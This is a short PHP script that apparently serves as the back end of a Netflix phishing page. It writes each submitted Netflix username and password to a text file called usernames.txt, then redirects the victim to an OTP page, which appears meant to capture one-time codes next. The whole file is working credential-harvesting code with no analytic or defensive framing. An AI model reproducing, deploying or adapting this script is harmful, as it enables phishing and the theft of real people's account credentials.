<?php
file_put_contents("usernames.txt", "NetFlix Username: " . $_POST['userLoginId'] . "\nPassword: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: otp.login.php');
exit();
?>
